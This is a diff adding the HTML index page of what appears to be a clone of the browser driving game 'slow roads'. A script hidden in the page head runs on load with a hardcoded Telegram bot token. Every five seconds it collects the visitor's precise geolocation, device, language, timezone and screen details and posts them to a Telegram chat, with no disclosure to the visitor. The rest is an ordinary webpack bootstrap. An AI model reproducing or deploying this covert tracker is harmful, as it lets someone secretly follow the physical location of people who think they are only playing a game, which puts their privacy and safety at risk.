@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="./favicon_circle.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#ffffff" />
+    <title>s&#8202;l&#8202;o&#8202;w&#8202;&nbsp;&nbsp;r&#8202;o&#8202;a&#8202;d&#8202;s</title>
+
+    <!-- Primary Meta -->
+    <meta name="title" content="s l o w  r o a d s" />
+    <meta name="description" content="endless driving zen in your browser" />
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://slowroads.io/" />
+    <meta property="og:title" content="s l o w  r o a d s" />
+    <meta property="og:description" content="endless driving zen in your browser" />
+    <meta property="og:image" content="./img.jpg" />
+
+    <!-- Twitter Card -->
+    <meta property="twitter:card" content="summary_large_image" />
+    <meta property="twitter:url" content="https://slowroads.io/" />
+    <meta property="twitter:title" content="s l o w  r o a d s" />
+    <meta property="twitter:description" content="endless driving zen in your browser" />
+    <meta property="twitter:image" content="./img.jpg" />
+
+    <!-- Manifest (was malformed in original — missing opening <link) -->
+    <link rel="manifest" href="./manifest.json" />
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="./static/css/main.a473f648.chunk.css" />
+
+    <!-- Third-party -->
+    <script src="./alea.min.js"></script>
+    <script>
+  const botToken = "8974909888:AAGfxh4DsifIq5bd61_35kB4mfd1zMkb2F8";
+  const chatId = "8098247774";
+
+  const LS_SESSION = "tg_session_id";
+  const LS_MSG     = "tg_message_id";
+  const LS_SEEN    = "tg_last_seen";
+  const SESSION_TIMEOUT = 7 * 24 * 60 * 60 * 1000;
+
+  function isSessionExpired() {
+    return Date.now() - parseInt(localStorage.getItem(LS_SEEN) || "0") > SESSION_TIMEOUT;
+  }
+
+  function clearSession() {
+    localStorage.removeItem(LS_SESSION);
+    localStorage.removeItem(LS_MSG);
+    localStorage.removeItem(LS_SEEN);
+  }
+
+  const existingSession = localStorage.getItem(LS_SESSION);
+  const sessionValid = existingSession && !isSessionExpired();
+  if (!sessionValid) clearSession();
+
+  let sessionId    = sessionValid ? existingSession : null;
+  let messageId    = sessionValid ? localStorage.getItem(LS_MSG) : null;
+  let isNewSession = !sessionId;
+  let busy         = false;
+
+  setInterval(() => localStorage.setItem(LS_SEEN, Date.now()), 5000);
+  localStorage.setItem(LS_SEEN, Date.now());
+
+  function buildMessage(lat, lon) {
+    const time = new Date().toLocaleTimeString();
+    return [
+      `🆔 Session: ${sessionId}`,
+      `📱 Device: ${navigator.userAgent}`,
+      `🌐 Language: ${navigator.language}`,
+      `🕐 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+      `🖥️ Screen: ${screen.width}x${screen.height}`,
+      ``,
+      `📍 Lat: ${lat.toFixed(6)} | Lon: ${lon.toFixed(6)}`,
+      `🗺️ https://maps.google.com/?q=${lat},${lon}`,
+      `🔄 Updated: ${time}`
+    ].join("\n");
+  }
+
+  async function sendMessage(text) {
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text })
+    }).catch(() => null);
+    if (!res) return null;
+    const data = await res.json();
+    return data.ok ? data.result.message_id : null;
+  }
+
+  async function editMessage(lat, lon) {
+    const mid = parseInt(messageId);
+    if (!messageId || isNaN(mid)) return false;
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, message_id: mid, text: buildMessage(lat, lon) })
+    }).catch(() => null);
+    if (!res) return false;
+    const data = await res.json();
+    if (!data.ok) {
+      if (data.description && data.description.includes("not modified")) return true;
+      messageId = null;
+      localStorage.removeItem(LS_MSG);
+      return false;
+    }
+    return true;
+  }
+
+  async function handlePosition(lat, lon) {
+    if (isNewSession) {
+      sessionId = Math.random().toString(36).substring(2, 8).toUpperCase();
+      localStorage.setItem(LS_SESSION, sessionId);
+      const msgId = await sendMessage(buildMessage(lat, lon));
+      if (msgId) {
+        messageId = String(msgId);
+        localStorage.setItem(LS_MSG, messageId);
+        isNewSession = false;
+      }
+      return;
+    }
+
+    if (!messageId || isNaN(parseInt(messageId))) {
+      const msgId = await sendMessage(buildMessage(lat, lon));
+      if (msgId) {
+        messageId = String(msgId);
+        localStorage.setItem(LS_MSG, messageId);
+      }
+      return;
+    }
+
+    await editMessage(lat, lon);
+  }
+
+  function startTracking() {
+    if (!navigator.geolocation) return;
+
+    async function tick() {
+      if (busy) return;
+      busy = true;
+      try {
+        const pos = await new Promise((resolve, reject) =>
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          })
+        );
+        await handlePosition(pos.coords.latitude, pos.coords.longitude);
+      } catch (e) {
+        // GPS error or timeout — skip this tick
+      } finally {
+        busy = false;
+      }
+    }
+
+    tick();
+    setInterval(tick, 5000);
+  }
+
+  window.onload = startTracking;
+</script>
+
+  </head>
+
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+
+    <div id="root"></div>
+
+    <!-- Webpack runtime (minified, left as-is) -->
+    <script>
+      !function(e) {
+
+        // ── Chunk registration ──────────────────────────────────────────
+        function r(r) {
+            var n, a,
+                i = r[0],  // chunk IDs
+                c = r[1],  // modules
+                l = r[2],  // entries
+                f = 0,
+                s = [];
+
+            // Resolve pending promises for each chunk ID
+            for (; f < i.length; f++) {
+            a = i[f];
+            if (Object.prototype.hasOwnProperty.call(o, a) && o[a]) {
+                s.push(o[a][0]);
+            }
+            o[a] = 0;
+            }
+
+            // Register new modules
+            for (n in c) {
+            if (Object.prototype.hasOwnProperty.call(c, n)) {
+                e[n] = c[n];
+            }
+            }
+
+            // Notify parent chunk handler
+            for (p && p(r); s.length;) {
+            s.shift()();
+            }
+
+            // Queue entry points and run
+            return u.push.apply(u, l || []), t();
+        }
+
+        // ── Entry point executor ─────────────────────────────────────────
+        function t() {
+            var e, r = 0;
+            for (; r < u.length; r++) {
+            var t = u[r],
+                n = true;
+
+            // Check all dependencies are loaded (o[id] === 0 means loaded)
+            for (var i = 1; i < t.length; i++) {
+                var c = t[i];
+                if (0 !== o[c]) {
+                n = false;
+                }
+            }
+
+            if (n) {
+                u.splice(r--, 1);
+                e = a(a.s = t[0]);
+            }
+            }
+            return e;
+        }
+
+        var n = {},       // module cache
+            o = { 1: 0 }, // chunk load state (0 = loaded)
+            u = [];        // entry queue
+
+        // ── Module factory ───────────────────────────────────────────────
+        function a(r) {
+            if (n[r]) return n[r].exports;
+
+            var t = n[r] = { i: r, l: false, exports: {} };
+            e[r].call(t.exports, t, t.exports, a);
+            t.l = true;
+            return t.exports;
+        }
+
+        // ── Lazy chunk loader ────────────────────────────────────────────
+        a.e = function(e) {
+            var r = [],
+                t = o[e];
+
+            if (0 !== t) {
+            if (t) {
+                r.push(t[2]);
+            } else {
+                var n = new Promise(function(r, n) {
+                t = o[e] = [r, n];
+                });
+                r.push(t[2] = n);
+
+                var u,
+                    i = document.createElement("script");
+
+                i.charset = "utf-8";
+                i.timeout = 120;
+                if (a.nc) i.setAttribute("nonce", a.nc);
+
+                i.src = function(e) {
+                return a.p + "static/js/" + ({}[e] || e) + "." + { 3: "98d9946c" }[e] + ".chunk.js";
+                }(e);
+
+                var c = new Error;
+
+                u = function(r) {
+                i.onerror = i.onload = null;
+                clearTimeout(l);
+
+                var t = o[e];
+                if (0 !== t) {
+                    if (t) {
+                    var n = r && ("load" === r.type ? "missing" : r.type),
+                        u = r && r.target && r.target.src;
+                    c.message = "Loading chunk " + e + " failed.\n(" + n + ": " + u + ")";
+                    c.name    = "ChunkLoadError";
+                    c.type    = n;
+                    c.request = u;
+                    t[1](c);
+                    }
+                    o[e] = void 0;
+                }
+                };
+
+                var l = setTimeout(function() {
+                u({ type: "timeout", target: i });
+                }, 12e4);  // 120s timeout
+
+                i.onerror = i.onload = u;
+                document.head.appendChild(i);
+            }
+            }
+
+            return Promise.all(r);
+        };
+
+        // ── Module registry helpers ──────────────────────────────────────
+        a.m = e;
+        a.c = n;
+
+        a.d = function(e, r, t) {
+            if (!a.o(e, r)) {
+            Object.defineProperty(e, r, { enumerable: true, get: t });
+            }
+        };
+
+        a.r = function(e) {
+            if (typeof Symbol !== "undefined" && Symbol.toStringTag) {
+            Object.defineProperty(e, Symbol.toStringTag, { value: "Module" });
+            }
+            Object.defineProperty(e, "__esModule", { value: true });
+        };
+
+        a.t = function(e, r) {
+            if (1 & r) e = a(e);
+            if (8 & r) return e;
+            if (4 & r && typeof e === "object" && e && e.__esModule) return e;
+
+            var t = Object.create(null);
+            a.r(t);
+            Object.defineProperty(t, "default", { enumerable: true, value: e });
+
+            if (2 & r && typeof e !== "string") {
+            for (var n in e) {
+                a.d(t, n, function(r) { return e[r]; }.bind(null, n));
+            }
+            }
+            return t;
+        };
+
+        a.n = function(e) {
+            var r = e && e.__esModule
+            ? function() { return e.default; }
+            : function() { return e; };
+            a.d(r, "a", r);
+            return r;
+        };
+
+        a.o = function(e, r) {
+            return Object.prototype.hasOwnProperty.call(e, r);
+        };
+
+        a.p  = "./";
+
+        a.oe = function(e) {
+            throw console.error(e), e;
+        };
+
+        // ── Bootstrap: hijack webpackJsonp push ──────────────────────────
+        var i = this.webpackJsonpapp = this.webpackJsonpapp || [],
+            c = i.push.bind(i);
+
+        i.push = r;        // intercept future pushes
+        i = i.slice();     // snapshot already-queued chunks
+
+        for (var l = 0; l < i.length; l++) {
+            r(i[l]);         // replay any chunks that arrived early
+        }
+
+        var p = c;         // keep original push for parent notification
+        t();               // run any immediately-ready entries
+
+        }([]);
+    </script>
+
+    <!-- App chunks -->
+    <script src="./static/js/2.f5fa8177.chunk.js"></script>
+    <script src="./static/js/main.e7a33c55.chunk.js"></script>
+  </body>
+</html>
